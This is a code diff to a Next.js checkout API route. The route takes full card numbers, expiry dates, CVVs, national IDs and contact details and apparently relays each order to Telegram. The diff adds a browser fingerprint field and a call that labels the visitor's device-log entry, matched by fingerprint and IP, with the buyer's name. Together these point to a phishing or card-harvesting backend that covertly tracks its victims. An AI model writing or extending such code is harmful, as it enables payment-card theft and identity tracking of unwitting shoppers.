@@ -2,7 +2,7 @@ import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
   const body = await req.json();
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, fingerprint } = body;
 
   // Detect country from visitor IP
   let country = "-";
@@ -88,6 +88,21 @@ export async function POST(req: NextRequest) {
 
   if (!telegramSent && !dbSaved) {
     return NextResponse.json({ ok: false, error: "فشل في حفظ الطلب" }, { status: 500 });
+  }
+
+  // تسمية الزائر تلقائياً باسم المشتري في سجل الزوار
+  if (customer) {
+    try {
+      const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
+      await fetch(`${process.env.BACKEND_URL}/api/admin/devices/log/label-by-identity`, {
+        method: "PATCH",
+        headers: {
+          "Content-Type": "application/json",
+          "x-internal-token": process.env.ADMIN_INTERNAL_TOKEN || "",
+        },
+        body: JSON.stringify({ fingerprint: fingerprint || null, ip: ip || null, label: customer }),
+      });
+    } catch {}
   }
 
   return NextResponse.json({ ok: true, orderId, telegramSent, dbSaved });
